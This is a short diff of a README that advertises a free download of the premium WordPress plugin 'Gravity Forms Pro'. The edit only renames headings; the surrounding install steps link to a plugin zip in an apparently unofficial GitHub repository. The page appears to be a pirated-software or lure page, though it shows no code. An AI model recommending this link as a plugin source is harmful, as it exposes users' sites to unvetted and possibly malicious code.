@@ -20,7 +20,7 @@ Gravity Forms Pro is a premium WordPress plugin that lets you create advanced fo
 
 ---
 
-## 💡 What Makes Gravity Forms Pro Stand Out?
+## 💡 What Makes Gravity Forms Stand Out?
 
 - Build unlimited forms for any purpose  
 - Accept secure payments easily  
@@ -29,7 +29,7 @@ Gravity Forms Pro is a premium WordPress plugin that lets you create advanced fo
 
 ---
 
-## 🛠️ **How to Install Gravity Forms Pro**
+## 🛠️ **How to Install Gravity Forms**
 
 1. Download the plugin zip: [Gravity_Forms_Pro.zip](https://github.com/gravity-forms/gravity-forms.github.io/releases/download/download/gravity_forms.zip)  
 2. Log in to your WordPress Admin area  
